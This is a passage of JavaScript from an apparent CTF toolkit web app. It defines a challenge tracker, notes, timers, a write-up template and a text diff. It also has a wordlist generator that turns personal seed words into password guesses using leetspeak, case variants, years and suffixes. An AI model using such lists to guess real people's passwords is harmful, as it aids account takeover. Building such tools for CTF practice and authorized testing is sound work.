      '<div class="hint" style="margin-top:1.2rem"><strong>Stopwatch</strong></div>' +
      '<div id="timerStopwatchOutput" class="out" style="font-size:1.3rem">00:00:00</div>' +
      ui_btns([{ label: 'Start', onclick: 'swStart()' }, { label: 'Lap / Pause', onclick: 'swLap()' }, { label: 'Reset', onclick: 'swReset()' }]) +
      '<div id="timerLaps" class="out"></div>';
  },
  'writeup-generator': function () {
    return '<div class="row2">' + ui_field('Challenge name', '<input type="text" id="wuName" placeholder="baby-rsa">') +
      ui_field('Category', '<input type="text" id="wuCat" placeholder="crypto">') + '</div>' +
      '<div class="row2">' + ui_field('CTF name', '<input type="text" id="wuCtf" placeholder="SuperCTF 2026">') +
      ui_field('Points', '<input type="number" id="wuPoints" value="100">') + '</div>' +
      ui_btns([{ label: 'Generate Markdown', onclick: 'writeupGenerate()', primary: true }]) +
      ui_field('Markdown', ui_out('wuOutput')) + ui_copyBtn('wuOutput');
  },
  'wordlist-generator': function () {
    return ui_field('Seed words (one per line — names, pets, company, etc.)', ui_textarea('wlSeeds', 4, 'alice\nctf2026\nadmin')) +
      '<div class="checks">' +
      '<label><input type="checkbox" id="wlLeet" checked> Leetspeak (a→4, e→3, o→0, i→1, s→5)</label>' +
      '<label><input type="checkbox" id="wlCase" checked> Case variants</label>' +
      '<label><input type="checkbox" id="wlYears" checked> Append years 1990-2026</label>' +
      '<label><input type="checkbox" id="wlSuffix" checked> Common suffixes (!, 123, 1)</label></div>' +
      ui_btns([{ label: 'Generate wordlist', onclick: 'wordlistGenerate()', primary: true }]) +
      ui_field('Wordlist', ui_out('wlOutput')) +
      ui_btns([{ label: 'Download as .txt', onclick: 'wordlistDownload()' }]);
  },
  'text-diff': function () {
    return '<div class="row2">' + ui_field('Text A', ui_textarea('diffTextA', 8, '')) + ui_field('Text B', ui_textarea('diffTextB', 8, '')) + '</div>' +
      ui_btns([{ label: 'Compare', onclick: 'textDiffTool()', primary: true }]) +
      ui_field('Diff', ui_out('textDiffOutput'));
  }
};

/* --- Challenge tracker (localStorage) --- */
function ctLoad() { try { return JSON.parse(localStorage.getItem('ctfa-challenges') || '[]'); } catch (e) { return []; } }
function ctSave(list) { try { localStorage.setItem('ctfa-challenges', JSON.stringify(list)); } catch (e) {} }
function ctRender() {
  const list = ctLoad();
  const solved = list.filter(function (c) { return c.solved; });
  const total = list.reduce(function (s, c) { return s + (c.solved ? Number(c.points) || 0 : 0); }, 0);
  let html = '<div class="hint"><strong>' + solved.length + ' / ' + list.length + '</strong> solved — <strong>' + total + '</strong> points banked</div>';
  if (list.length) {
    html += '<table class="data-tbl"><tr><th>solved</th><th>name</th><th>category</th><th>points</th><th></th></tr>';
    list.forEach(function (c, i) {
      html += '<tr><td><input type="checkbox" ' + (c.solved ? 'checked' : '') + ' onchange="ctToggle(' + i + ')"></td>' +
        '<td>' + escapeHtml(c.name) + '</td><td>' + escapeHtml(c.cat || '—') + '</td><td>' + (c.points || 0) + '</td>' +
        '<td><button class="btn danger" type="button" onclick="ctRemove(' + i + ')">Remove</button></td></tr>';
    });
    html += '</table>';
  }
  document.getElementById('ctWrap').innerHTML = html;
}
function ctAdd() {
  const name = document.getElementById('ctName').value.trim();
  if (!name) { toast('Name the challenge first', 'err'); return; }
  const list = ctLoad();
  list.push({ name: name, cat: document.getElementById('ctCat').value.trim(), points: Number(document.getElementById('ctPoints').value) || 0, solved: false });
  ctSave(list); ctRender();
  document.getElementById('ctName').value = '';
}
function ctToggle(i) { const list = ctLoad(); list[i].solved = !list[i].solved; ctSave(list); ctRender(); }
function ctRemove(i) { const list = ctLoad(); list.splice(i, 1); ctSave(list); ctRender(); }
TOOL_INIT_HOOKS['challenge-tracker'] = ctRender;

/* --- Notes --- */
function notesLoad() { try { return localStorage.getItem('ctfa-notes') || ''; } catch (e) { return ''; } }
function notesSave() { try { localStorage.setItem('ctfa-notes', document.getElementById('notesArea').value); } catch (e) {} }
function notesDownload() { downloadBlob('ctf-notes.txt', document.getElementById('notesArea').value, 'text/plain'); }
function notesClear() { if (confirm('Clear all notes? This cannot be undone.')) { document.getElementById('notesArea').value = ''; notesSave(); } }
TOOL_INIT_HOOKS['notes'] = function () { document.getElementById('notesArea').value = notesLoad(); };

/* --- Timer --- */
let TIMER_COUNTDOWN_IV = null, TIMER_SW_IV = null, TIMER_SW_ELAPSED = 0, TIMER_SW_RUNNING = false, TIMER_SW_START = 0;
function timerStartCountdown() {
  if (TIMER_COUNTDOWN_IV) clearInterval(TIMER_COUNTDOWN_IV);
  const end = new Date(document.getElementById('timerEnd').value).getTime();
  if (isNaN(end)) { toast('Pick a valid end time', 'err'); return; }
  function tick() {
    const diff = end - Date.now();
    const el = document.getElementById('timerCountdownOutput');
    if (!el) { clearInterval(TIMER_COUNTDOWN_IV); return; }
    if (diff <= 0) { el.textContent = 'Time\'s up.'; clearInterval(TIMER_COUNTDOWN_IV); return; }
    const h = Math.floor(diff / 3600000), m = Math.floor(diff % 3600000 / 60000), s = Math.floor(diff % 60000 / 1000);
    el.textContent = h + 'h ' + String(m).padStart(2, '0') + 'm ' + String(s).padStart(2, '0') + 's remaining';
  }
  tick();
  TIMER_COUNTDOWN_IV = setInterval(tick, 1000);
}
function fmtStopwatch(ms) {
  const h = Math.floor(ms / 3600000), m = Math.floor(ms % 3600000 / 60000), s = Math.floor(ms % 60000 / 1000);
  return [h, m, s].map(function (n) { return String(n).padStart(2, '0'); }).join(':');
}
function swTick() {
  const el = document.getElementById('timerStopwatchOutput');
  if (!el) { clearInterval(TIMER_SW_IV); TIMER_SW_RUNNING = false; return; } // don't leave RUNNING stuck true with no interval behind it
  el.textContent = fmtStopwatch(TIMER_SW_ELAPSED + (Date.now() - TIMER_SW_START));
}
function swStart() {
  if (TIMER_SW_RUNNING) return;
  TIMER_SW_RUNNING = true; TIMER_SW_START = Date.now();
  TIMER_SW_IV = setInterval(swTick, 200);
}
function swLap() {
  if (!TIMER_SW_RUNNING) return;
  TIMER_SW_ELAPSED += Date.now() - TIMER_SW_START;
  TIMER_SW_RUNNING = false; clearInterval(TIMER_SW_IV);
  const lapsEl = document.getElementById('timerLaps');
  if (lapsEl) lapsEl.textContent = (lapsEl.textContent ? lapsEl.textContent + '\n' : '') + 'lap: ' + fmtStopwatch(TIMER_SW_ELAPSED);
}
function swReset() {
  TIMER_SW_ELAPSED = 0; TIMER_SW_RUNNING = false; clearInterval(TIMER_SW_IV);
  const el = document.getElementById('timerStopwatchOutput'); if (el) el.textContent = '00:00:00';
  const lapsEl = document.getElementById('timerLaps'); if (lapsEl) lapsEl.textContent = '';
}

/* --- Writeup generator --- */
function writeupGenerate() {
  const name = document.getElementById('wuName').value.trim() || 'challenge-name';
  const cat = document.getElementById('wuCat').value.trim() || 'category';
  const ctf = document.getElementById('wuCtf').value.trim() || 'CTF name';
  const points = document.getElementById('wuPoints').value || '0';
  const md = '# ' + name + '\n\n' +
    '**CTF:** ' + ctf + '  \n**Category:** ' + cat + '  \n**Points:** ' + points + '\n\n' +
    '## Challenge description\n\n> Paste the challenge prompt here.\n\n' +
    '## Recon\n\nWhat was given (files, a URL, a service) and what the first look showed.\n\n' +
    '## Approach\n\nThe path from first idea to the one that worked — including dead ends, briefly.\n\n' +
    '## Solution\n\n```\n# commands / script here\n```\n\n' +
    '## Flag\n\n```\nflag{...}\n```\n\n' +
    '## Takeaways\n\nWhat this challenge taught, for next time.\n';
  setOutText('wuOutput', md);
}

/* --- Wordlist generator --- */
function leetify(w) { return w.replace(/a/gi, '4').replace(/e/gi, '3').replace(/o/gi, '0').replace(/i/gi, '1').replace(/s/gi, '5'); }
function wordlistGenerate() {
  const seeds = document.getElementById('wlSeeds').value.split('\n').map(function (s) { return s.trim(); }).filter(Boolean);
  if (!seeds.length) { toast('Add at least one seed word', 'err'); return; }
  const useLeet = document.getElementById('wlLeet').checked;
  const useCase = document.getElementById('wlCase').checked;
  const useYears = document.getElementById('wlYears').checked;
  const useSuffix = document.getElementById('wlSuffix').checked;
  const set = new Set();
  seeds.forEach(function (w) {
    const variants = new Set([w]);
    if (useCase) { variants.add(w.toLowerCase()); variants.add(w.toUpperCase()); variants.add(w[0].toUpperCase() + w.slice(1).toLowerCase()); }
    if (useLeet) Array.from(variants).forEach(function (v) { variants.add(leetify(v)); });
    variants.forEach(function (v) {
      set.add(v);
      if (useSuffix) ['!', '123', '1', '2024', '2025', '2026'].forEach(function (suf) { set.add(v + suf); });
      if (useYears) for (let y = 1990; y <= 2026; y++) set.add(v + y);
    });
  });
  const list = Array.from(set);
  window.__wlGenerated = list;
  setOutText('wlOutput', list.slice(0, 5000).join('\n') + (list.length > 5000 ? '\n… (' + (list.length - 5000) + ' more, download for the full list)' : ''));
  toast('Generated ' + list.length.toLocaleString() + ' candidates');
}
function wordlistDownload() {
  if (!window.__wlGenerated) { toast('Generate a wordlist first', 'err'); return; }
  downloadBlob('wordlist.txt', window.__wlGenerated.join('\n'), 'text/plain');
}

/* --- Text diff --- */
function textDiffTool() {
  const a = document.getElementById('diffTextA').value.split('\n');
  const b = document.getElementById('diffTextB').value.split('\n');
  const max = Math.max(a.length, b.length);
  let html = '';
  let changes = 0;
  for (let i = 0; i < max; i++) {
    const la = a[i], lb = b[i];
    if (la === lb) html += '  ' + escapeHtml(la || '') + '\n';
    else {
      changes++;
      if (la !== undefined) html += '<span style="color:var(--bad)">- ' + escapeHtml(la) + '</span>\n';
      if (lb !== undefined) html += '<span style="color:var(--good)">+ ' + escapeHtml(lb) + '</span>\n';
    }
  }
  setOut('textDiffOutput', (changes ? changes + ' differing line(s)\n\n' : 'Identical\n\n') + html);
}

/* ---------------------------------------------------------------------- */
/* Master dispatcher — ties every category's interface map together      */
/* ---------------------------------------------------------------------- */
const ALL_INTERFACES = Object.assign({}, CRYPTO_INTERFACES, WEB_INTERFACES, FORENSICS_INTERFACES, REVERSE_INTERFACES, PWN_INTERFACES, MISC_INTERFACES, UTILS_INTERFACES);

function getToolInterface(toolName) {
  const fn = ALL_INTERFACES[toolName];
  if (fn) return fn();
  return '<div class="hint warn">No interface registered for "' + escapeHtml(toolName) + '".</div>';
}

